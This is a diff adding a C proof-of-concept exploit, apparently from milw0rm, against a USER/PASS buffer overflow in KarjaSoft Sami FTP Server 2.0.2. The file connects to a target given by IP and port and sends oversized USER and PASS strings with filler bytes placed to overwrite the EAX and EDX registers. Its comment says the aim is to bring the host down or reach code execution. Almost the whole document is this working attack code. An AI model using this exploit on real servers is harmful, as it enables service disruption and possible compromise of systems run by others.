@@ -1,0 +1,86 @@
+/************************************************************************
+*KarjaSoft Sami FTP Server 2.0.2 USER/PASS buffer overflow              *
+*                                                                       *
+*Sending a long USER / PASS request to server triggers the vulnerability*
+*EAX and EDX are owned leading to code execution                        *
+*This is only a POC                                                     *
+*Thanks to rewterz and Muhammad Ahmed Siddiqui for discovery            *
+*                                                                       *
+*Usage: sami.exe ip port                                                *
+*                                                                       *
+*Coded by Marsu <Marsupilamipowa@hotmail.fr>                            *
+************************************************************************/
+
+#include "winsock2.h"
+#include "stdio.h"
+#include "stdlib.h"
+#pragma comment(lib, "ws2_32.lib")
+
+int main(int argc, char* argv[])
+{
+	struct hostent *he;
+	struct sockaddr_in sock_addr;
+	WSADATA wsa;
+	int ftpsock;
+	char recvbuff[1024];
+	char evilbuff[1024];
+	int buflen=600;// 650 will kill the app. 600 just call the debugger
+
+	if (argc!=3)
+	{
+		printf("[+] Usage: %s <ip> <port>\n",argv[0]);
+		return 1;
+	}
+	WSACleanup();
+	WSAStartup(MAKEWORD(2,0),&wsa);
+
+	printf("[+] Connecting to %s:%s ... ",argv[1],argv[2]);
+	if ((he=gethostbyname(argv[1])) == NULL) {
+		printf("Failed\n[-] Could not init gethostbyname\n");
+		return 1;
+	}
+	if ((ftpsock = socket(PF_INET, SOCK_STREAM, 0)) == -1) {
+		printf("Failed\n[-] Socket error\n");
+		return 1;
+	}
+
+	sock_addr.sin_family = PF_INET;
+	sock_addr.sin_port = htons(atoi(argv[2]));
+	sock_addr.sin_addr = *((struct in_addr *)he->h_addr);
+	memset(&(sock_addr.sin_zero), '\0', 8);
+	if (connect(ftpsock, (struct sockaddr *)&sock_addr, sizeof(struct sockaddr)) == -1) {
+		printf("Failed\n[-] Sorry, cannot connect to %s:%s. Error: %i\n", argv[1],argv[2],WSAGetLastError());
+		return 1;
+	}
+	printf("OK\n");
+	memset(recvbuff,'\0',1024);
+	recv(ftpsock, recvbuff, 1024, 0);
+
+	printf("[+] Building payload ... ");
+	memset(evilbuff,'A',buflen);
+	memset(evilbuff+585,'B',4);	//eax and edx will be 42424262
+	memcpy(evilbuff,"USER ",5);
+	memcpy(evilbuff+buflen,"\r\n\0",3);
+	printf("OK\n[+] Sending USER ... ");
+	if (send(ftpsock,evilbuff,strlen(evilbuff),0)==-1) {
+		printf("Failed\n[-] Could not send\n");
+		return 1;
+	}
+	printf("OK\n");
+	memset(recvbuff,'\0',1024);
+	recv(ftpsock, recvbuff, 1024, 0);
+
+	memcpy(evilbuff,"PASS ",5);
+	printf("[+] Sending PASS ... ");
+	if (send(ftpsock,evilbuff,strlen(evilbuff),0)==-1) {
+		printf("Failed\n[-] Could not send\n");
+		return 1;
+	}
+	printf("OK\n");
+	recv(ftpsock, recvbuff, 1024, 0);
+
+	printf("[+] Host should be down\n");
+	return 0;
+}
+
+// milw0rm.com [2007-01-14]
